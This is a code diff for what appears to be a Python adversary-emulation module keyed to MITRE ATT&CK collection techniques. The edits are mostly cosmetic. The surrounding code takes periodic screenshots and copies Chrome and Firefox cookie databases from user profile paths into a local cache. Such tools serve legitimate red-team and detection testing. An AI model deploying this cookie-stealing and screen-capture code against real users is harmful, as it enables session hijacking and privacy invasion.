@@ -10,7 +10,7 @@ The adversary is trying to gather data of interest to their goal.
 https://attack.mitre.org/tactics/TA0009/
 """
 
-CACHE_PATH = os.path.join(os.path.dirname(__file__),"cache")
+CACHE_PATH = os.path.join(os.path.dirname(__file__), "cache")
 
 def clipboard_data_alternation(platform):
     """
@@ -44,7 +44,7 @@ def clipboard_data_alternation(platform):
 
 def screen_capture(platform):
     """
-    TT1113  Screen Capture
+    T1113  Screen Capture
     Platforms: Windows, Linux, Darwin
     """
 
@@ -56,7 +56,7 @@ def screen_capture(platform):
     try:
         import pygrabshot
     except Exception as Err:
-        print(f"Warning: pygrabshot import error: {Err}")
+        print(f"Warning: T1113 pygrabshot import error: {Err}")
 
 
     def screen():
@@ -69,7 +69,7 @@ def screen_capture(platform):
                 time.sleep(6)
 
             except Exception as e:
-                print(f"Warning: Error taking screenshot: {e}")
+                print(f"Warning: T1113 Error taking screenshot: {e}")
                 break
 
     thread = Thread(target=screen)
@@ -89,13 +89,13 @@ def steel_cookie_db(platform, username):
         try:
             shutil.copy2(src_file, CACHE_PATH)
         except:
-            print("Warning: Chrome Cookie DB not found.")
+            print("Warning: T1539 Chrome Cookie DB not found.")
         # "Firefox" /home/[Your User Name]/.mozilla/firefox/[Profile Name]/cookies.sqlite
         src_file = f"/home/{username}/.mozilla/firefox/[Profile Name]/cookies.sqlite"
         try:
             shutil.copy2(src_file, CACHE_PATH)
         except:
-            print("Warning: Mozilla Cookie DB not found")
+            print("Warning: T1539 Mozilla Cookie DB not found")
 
     if platform == "Darwin":
         # "Chrome" /Users/[Your User Name]/Library/Application Support/Google/Chrome/Default/Cookies
@@ -105,7 +105,7 @@ def steel_cookie_db(platform, username):
             try:
                 src_file = f"/Users/{username}/Library/Application Support/Google/Chrome/{default_string}/Cookies"
                 shutil.copy2(src_file, CACHE_PATH)
-                print(f"Info: Collection of file done: {src_file}")
+                print(f"Info: T1539 Collection of file done: {src_file}")
             except:
                 pass
 
@@ -115,7 +115,7 @@ def steel_cookie_db(platform, username):
             try:
                 src_file = os.path.join(default_path, "cookies.sqlite")
                 shutil.copy2(src_file, CACHE_PATH)
-                print(f"Info: Collection of file done: {src_file}")
+                print(f"Info: T1539 Collection of file done: {src_file}")
             except:
                 pass
 
